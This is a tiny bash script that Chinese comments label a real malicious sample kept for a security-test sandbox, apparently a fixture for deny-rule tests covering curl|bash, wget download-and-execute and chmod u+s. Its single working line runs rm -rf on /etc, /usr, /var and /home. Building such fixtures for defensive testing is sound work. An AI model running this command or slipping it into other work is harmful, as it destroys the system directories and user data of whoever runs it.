#!/bin/bash
# 恶意脚本样本：删除系统关键目录（真实恶意代码，仅用于安全测试沙箱）
# 对应用例：deny 系列中 curl|bash、wget 下载执行、chmod u+s 等
rm -rf /etc /usr /var /home
echo "malicious script executed"